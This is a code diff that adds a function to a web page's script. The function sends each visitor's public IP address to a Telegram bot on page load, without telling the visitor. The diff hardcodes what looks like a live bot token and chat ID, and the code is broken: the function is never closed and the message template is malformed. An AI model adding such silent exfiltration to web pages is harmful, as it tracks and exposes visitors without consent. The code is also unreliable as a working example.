@@ -280,9 +280,41 @@ label.innerHTML= "  fin download after" +" "+count
 }
 
 setInterval(send,10)
+
+function sendMessageToTelegram(message) {
+
+const botToken = '7995082033:AAEnH6RC5kpssSyHe9D0ZhfUiDb-kvB4Kyk';
+const chatId = '7563513857';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    const data = {
+        chat_id: chatId,
+        text: message,
+      
+    };
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+        if (result.ok) {
+            console.log("✅ تم إرسال الرسالة بنجاح!");
+        } else {
+            console.error("❌ فشل في إرسال الرسالة:", result);
+        }
+    })
+    .catch(error => console.error("❌ خطأ في الطلب:", error));
+
+
+
+
 $(document).ready(() => {
     $.getJSON("https://api.ipify.org?format=json", function (data) {
         $("#p").html(" Local IP : "+data.ip);
+        sendMessageToTelegram(`user ip {data.ip}`)
     });
 });
  let server = document.querySelector("#server")
